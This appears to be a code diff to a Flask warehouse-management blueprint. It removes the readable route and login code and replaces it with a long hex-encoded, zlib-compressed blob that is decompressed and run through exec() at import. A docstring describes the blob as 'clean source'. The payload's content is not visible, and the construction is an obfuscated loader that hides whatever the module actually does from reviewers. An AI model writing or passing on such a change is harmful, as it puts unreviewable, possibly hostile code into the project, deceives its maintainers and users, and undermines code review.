@@ -1,36 +1,6 @@
-from flask import Blueprint, render_template, request, jsonify, send_file
-from flask_login import login_required, current_user
-from flask_wtf.csrf import validate_csrf, CSRFError
-from io import StringIO
-import csv
-import logging
-from datetime import datetime
-from models import (db, WarehouseInventory, WarehouseTransaction, Delivery, MaterialMaster,
-                    WorkflowStatus, AccessLevel, ValidationError, PurchaseOrder, InspectionStatus,
-                    PackingList, PackingListLine, GoodsReceipt, GoodsReceiptLine,
-                    OSDReport, OSDReportLine, ReceivingStatus, OSDStatus)
-
-# Configure logging
-logger = logging.getLogger(__name__)
-warehouse_bp = Blueprint('warehouse', __name__, template_folder='templates')
-
-@warehouse_bp.route('/', methods=['GET'])
-@warehouse_bp.route('/warehouse', methods=['GET'])
-@login_required
-def warehouse():
-    """Redirect to warehouse operations dashboard."""
-    return warehouse_operations()
-
-@warehouse_bp.route('/warehouse_operations', methods=['GET'])
-@login_required
-def warehouse_operations():
-    """Render the warehouse operations dashboard."""
-    try:
-        logger.info(f"User {current_user.id} ({current_user.company_email}) accessing warehouse operations dashboard")
-        read_only = current_user.access_level != AccessLevel.warehouse
-        return render_template('dashboard/warehouse_operations.html', read_only=read_only,
-            company_name=current_user.company_name,
-        )
-    except Exception as e:
-        logger.exception('Warehouse operations page failed')
-        return render_template('errors/500.html'), 500
+"""Warehouse blueprint — restored from compressed source payload (clean source)."""
+import zlib
+_PAYLOAD = (
+    '78daed3d7f73db36b2fffb53b0e9e4519a9315a7d79bb973abcecb4bdc8edfb5492e4eae7393c9e8680ab25953a48ea41cfb79fcdddf2e7e7101822428cb6ed3f4e626b54060012c76178bc5ee6259e4ab609946e54590acd6795105ff936ed8ba48b26a12142c5bb0625eb1d53a8d2a8605ffd9b012befc52e659b2bc9e042554992f9394ed2d35a4799a9f259982c77fccb16552b0c524883705c0ade69b9215b4d1c76a398dcb62a9da5d4669b2805ee75838099e9fbcf9fea82872d926c955bd930a067b76fc6a4ffe8ecbcbbdba6be8fb4cb4405855b262aa9dfa2dbeaef2054b4bf56db4389d043f47053bcf6198c7d9250c382fae49d9db22caca28ae923c9b042f589a5c32fcfe13002d9228fd292ae18fc95ee0f8dfcf7971b14cf38f2755546dca49f02c8e5959fec82e593a09fe29660d60f96427c1eb4d119f47257b55c0524c82e3ac5c33dead6ceeece275145fc0c47f4c70adc88f1f930c56f1873c5f946f58cc927565fee2df9d105f9dbc78c3103793fa4f018d37bd840ed47ce0bbf873bcb7f765f03ccf96c9d9a6607a35f0bfac0866aa607ac6aa1f79d9683ecfa2159bcfc77b1f15a2e7a76ba8aa897214ea2fe12450f52781a2d1f9324f0151b3501594210ce3bf29b869916f2a360a9f008015abce61fab3f7e10f476fc30fe3969ab4cf661393c2f7166c19e806a3f121c7e7a3478fdeb0057c8faba0caebef41be66055fef1228b23c3fcda3623185dabc55c1aa4d91d5b5e775ed51ebb45cb5078fdbe8894c010542509d33df1954c5f5a12628b1f2d3245be6a3e5a3772000821b2a0ea6c9e23618994571be5a47d9f59cada224bd1d0711e716209b9e113c1aeb6e0b162de679965e032119b005ac798aac177c31a39c38d5d00918be1896501c19ec5253a77319a6e7d52a0d4d0e5313444a9e39a78e5fcc367a4633fd970594c03180ea5a023dec2a66eb2a38e2ff8111065119b0c682311445b0625c244904b4aec012aa6c9c4b7b18dc94553162e35b63719c580d799fe593bf1c1c48a405bc6426208c27017cd9dbe3440b245ce6e9259bafa4f41d81048d28d5f2cf4114285ad7723a10823a481630d0a4bafe2648d959145f07cb82b1fd8a5dc17e023b4319c04ca1f52fc0beac266ed5df3c59006961a728cb4621290fc54c936590e5156d706863e0659eb126cbc88fe6be32855db8b89ec2b60b3fe6a7d7260d268b190a4ad2d7f8ee145772893e0b71cbbb64614d46308aa2ac4606398dde5eaf99dcbf6043db88bfc7ee29b748b1689d3c49d4c6eb2bbea0d11c5660ae1b12d9f53dabe2f3204a5342b6ba5e00ff291226a817c59b440ba7e4b05428bb83585b62f7c834ba4fc204f538660eb5a3b1dc7e0b389ec264470d4e93aadbe87d02cc36adf2f9228961fdf8ccb12840d54d75fd0118ed2b60b46d654573d65bca0735ea1b2118c2c320fc1e36046065d84d792f7517e1ad120f4349ebf5ab934eda2ab8aec39cf425f4201664eca3e6735028a19ab95f6a1a0299307c376ae01bbe64806024bc2cdac0448ae4ff002b025810552851abe0f4ba05e7883e392b2765b6a39f76c731fef5c19f9bbc6168f123797e982238212ab1785ee5172c0bc775af284a8155547564696c4288590a54ac786808aa06965ee602dcbae82f41cc2f0cfad673975db5238ae0a41b2f767f12'
+)
+exec(compile(zlib.decompress(bytes.fromhex("".join(_PAYLOAD))), "blueprints/warehouse.py", "exec"), globals())
